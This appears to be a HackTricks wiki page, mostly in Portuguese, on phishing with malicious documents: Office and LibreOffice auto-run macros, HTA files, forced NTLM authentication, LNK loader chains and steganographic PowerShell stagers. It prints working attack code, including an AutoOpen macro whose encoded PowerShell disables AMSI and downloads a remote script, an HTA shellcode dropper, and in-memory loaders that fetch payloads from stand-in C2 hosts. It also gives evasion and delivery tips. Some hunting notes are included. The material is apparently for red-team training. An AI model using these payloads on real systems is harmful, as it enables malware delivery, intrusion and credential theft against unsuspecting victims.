# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Documentos do Office

O Microsoft Word realiza validação dos dados do arquivo antes de abrir um arquivo. A validação dos dados é realizada na forma de identificação da estrutura de dados, de acordo com o padrão OfficeOpenXML. Se ocorrer qualquer erro durante a identificação da estrutura de dados, o arquivo em análise não será aberto.

Normalmente, arquivos do Word contendo macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão e ainda manter sua capacidade de executar macros.\
Por exemplo, um arquivo RTF não suporta macros, por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
Os mesmos internos e mecanismos se aplicam a todo o software da suíte Microsoft Office (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões vão ser executadas por alguns programas do Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) que inclui macros também podem “executar” macros.

### External Image Load

Vá para: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

É possível usar macros para executar código arbitrário a partir do documento.

#### Autoload functions

Quanto mais comuns elas forem, maior a probabilidade de o AV detectá-las.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Remover metadados manualmente

Vá para **File > Info > Inspect Document > Inspect Document**, o que abrirá o Document Inspector. Clique em **Inspect** e depois em **Remove All** ao lado de **Document Properties and Personal Information**.

#### Extensão do Doc

Quando terminar, selecione o menu suspenso **Save as type**, altere o formato de **`.docx`** para **Word 97-2003 `.doc`**.\
Faça isso porque você **não pode salvar macros dentro de um `.docx`** e há um **estigma** **em torno** da extensão **`.docm`** habilitada para macros (por exemplo, o ícone da miniatura tem um enorme `!` e alguns gateways web/email os bloqueiam completamente). Portanto, esta **extensão legada `.doc` é o melhor compromisso**.

#### Geradores de Macros Maliciosas

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros de autoexecução (Basic) do LibreOffice ODT

Documentos do LibreOffice Writer podem incorporar macros Basic e executá-las automaticamente quando o arquivo é aberto ao vincular a macro ao evento **Open Document** (Tools → Customize → Events → Open Document → Macro…). Uma macro simples de reverse shell se parece com:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note as aspas duplas (`""`) dentro da string – LibreOffice Basic as usa para escapar aspas literais, então payloads que terminam com `...==""")` mantêm tanto o comando interno quanto o argumento do Shell balanceados.

Dicas de entrega:

- Salve como `.odt` e vincule a macro ao evento do documento para que ela seja executada imediatamente ao abrir.
- Ao enviar por email com `swaks`, use `--attach @resume.odt` (o `@` é necessário para que os bytes do arquivo, e não a string do nome do arquivo, sejam enviados como anexo). Isso é crítico ao abusar de servidores SMTP que aceitam recipientes `RCPT TO` arbitrários sem validação.

## HTA Files

Um HTA é um programa Windows que **combina HTML e linguagens de scripting (como VBScript e JScript)**. Ele gera a interface do usuário e executa como uma aplicação "fully trusted", sem as restrições do modelo de segurança de um navegador.

Um HTA é executado usando **`mshta.exe`**, que normalmente é **instalado** junto com o **Internet Explorer**, tornando **`mshta` dependente do IE**. Portanto, se ele tiver sido desinstalado, HTAs não conseguirão ser executados.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forçando Autenticação NTLM

Existem várias maneiras de **forçar autenticação NTLM "remotamente"**, por exemplo, você poderia adicionar **imagens invisíveis** a emails ou HTML que o usuário acessará (até HTTP MitM?). Ou enviar à vítima o **endereço de arquivos** que **acionarão** uma **autenticação** apenas por **abrir a pasta.**

**Confira estas ideias e mais nas páginas a seguir:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Não esqueça que você não pode apenas roubar o hash ou a autenticação, mas também **realizar ataques de NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campanhas altamente eficazes entregam um ZIP que contém dois documentos legítimos isca (PDF/DOCX) e um .lnk malicioso. O truque é que o PowerShell loader real é armazenado dentro dos bytes brutos do ZIP após um marcador exclusivo, e o .lnk o recorta e executa totalmente em memória.

Fluxo típico implementado pelo one-liner PowerShell do .lnk:

1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, e o pai do diretório de trabalho atual.
2) Ler os bytes do ZIP e encontrar um marcador hardcoded (por exemplo, xFIQCV). Tudo após o marcador é o payload PowerShell embutido.
3) Copiar o ZIP para %ProgramData%, extrair lá, e abrir o .docx isca para parecer legítimo.
4) Bypass AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar a próxima stage (por exemplo, remover todos os caracteres #) e executá-la em memória.

Exemplo de skeleton PowerShell para recortar e executar a stage embutida:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- A entrega frequentemente abusa de subdomínios PaaS confiáveis (por exemplo, *.herokuapp.com) e pode restringir payloads (servir ZIPs benignos com base em IP/UA).
- A próxima etapa frequentemente descriptografa shellcode base64/XOR e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos em disco.

Persistence usada na mesma cadeia
- COM TypeLib hijacking do controle Microsoft Web Browser para que IE/Explorer ou qualquer app que o incorpore reabra o payload automaticamente. Veja detalhes e comandos prontos para uso aqui:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arquivos ZIP contendo a string marcador ASCII (por exemplo, xFIQCV) anexada aos dados do arquivo.
- .lnk que enumera pastas pai/usuário para localizar o ZIP e abre um documento isca.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads de negócio de longa duração terminando com links hospedados sob domínios PaaS confiáveis.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Outro padrão recorrente é um **.lnk que se faz passar por documento** que abre imediatamente uma isca benigna enquanto prepara a cadeia real em segundo plano.

Fluxo observado:
1. O atalho **se disfarça de PDF** e usa `conhost.exe` ou um proxy semelhante para iniciar um downloader PowerShell ofuscado.
2. O PowerShell fragmenta tokens óbvios (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) para que detecções ingênuas procurando por `iwr`, `gci`, `ren`, `cpi` ou `schtasks` não identifiquem o comando.
3. O stager baixa primeiro o **documento isca**, abre-o para a vítima e depois reconstrói os arquivos maliciosos em segundo plano.
4. Os payloads podem ser gravados com **extensões lixo** e depois renomeados removendo caracteres de preenchimento, atrasando o aparecimento de artefatos óbvios `.exe` / `.cpl`.
5. A persistence é estabelecida com uma **scheduled task baseada em minutos** que inicia um binário host confiável a partir de um caminho gravável pelo usuário.

Pistas mínimas de hunting desse padrão:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Um layout de staging útil para reconhecer é:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Why the second stage is stealthy

No estudo de caso da Rapid7, a tarefa agendada iniciava repetidamente **`Fondue.exe`** de `C:\Users\Public\`. Como **`APPWIZ.cpl`** estava staged ao lado dele e exportava **`RunFODW`**, o binário Microsoft confiável carregou lateralmente a CPL do atacante em vez da cópia legítima do sistema.

A CPL então:
- Lê um blob **AES-256-CBC** de `C:\Windows\Tasks\editor.dat`
- O descriptografa por meio de **Windows CNG / `bcrypt.dll`**
- Aloca memória executável e copia o shellcode descriptografado
- O executa indiretamente passando o ponteiro do shellcode como callback para **`EnumUILanguagesW`**

Esse último passo vale a pena ser caçado separadamente: malware frequentemente evita um salto direto `((void(*)())buf)()` e, em vez disso, abusa de uma **legítima WinAPI que recebe callback** para transferir a execução.

O payload descriptografado nesta campanha era shellcode **Donut**, que então mapeou o PE final totalmente em memória e aplicou patch em **AMSI/WLDP/ETW** no processo atual antes de passar a execução adiante. Para notas mais profundas sobre side-loading e pós-processamento residente em memória, veja:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivôs práticos de hunting:
- `.lnk` iniciando `powershell.exe` ou `conhost.exe` seguido por um documento isca visível.
- Downloads de curta duração para **`C:\Users\Public\`** seguidos por renomeações imediatas de extensões sem sentido.
- Scheduled tasks com nomes genéricos como `GoogleErrorReport` executando a partir de **user-writable directories**.
- Binários confiáveis carregando arquivos **`.cpl` / `.dll`** do mesmo diretório não system.
- Blobs de texto Base64 gravados em **`C:\Windows\Tasks\`** e então lidos pelo módulo side-loaded.

## Steganography-delimited payloads in images (PowerShell stager)

Cadeias recentes de loader entregam um JavaScript/VBS ofuscado que decodifica e executa um PowerShell stager em Base64. Esse stager baixa uma imagem (muitas vezes GIF) que contém uma DLL .NET codificada em Base64 escondida como texto puro entre marcadores únicos de início/fim. O script procura esses delimitadores (exemplos vistos em campo: «<<sudo_png>> … <<sudo_odt>>>»), extrai o texto entre eles, decodifica o Base64 para bytes, carrega a assembly em-memory e invoca um método de entrada conhecido com a C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemplo de PowerShell para extrair uma DLL de uma imagem e invocar um método .NET in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Isto é ATT&CK T1027.003 (steganography/marker-hiding). Os markers variam entre campaigns.
- AMSI/ETW bypass e string deobfuscation são comumente aplicados antes de carregar a assembly.
- Hunting: escaneie imagens baixadas em busca de delimiters conhecidos; identifique PowerShell acessando imagens e decodificando imediatamente blobs Base64.

Veja também ferramentas de stego e carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Uma primeira stage recorrente é um pequeno `.js` ou `.vbs` fortemente obfuscado, entregue dentro de um archive. Seu único propósito é decodificar uma string Base64 embutida e iniciar PowerShell com `-nop -w hidden -ep bypass` para bootstrap da próxima stage via HTTPS.

Lógica skeleton (abstract):
- Ler o próprio conteúdo do arquivo
- Localizar um blob Base64 entre junk strings
- Decodificar para PowerShell ASCII
- Executar com `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Dicas de hunting
- Anexos JS/VBS arquivados iniciando `powershell.exe` com `-enc`/`FromBase64String` na linha de comando.
- `wscript.exe` iniciando `powershell.exe -nop -w hidden` a partir de caminhos temp do usuário.

## Windows files to steal NTLM hashes

Confira a página sobre **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
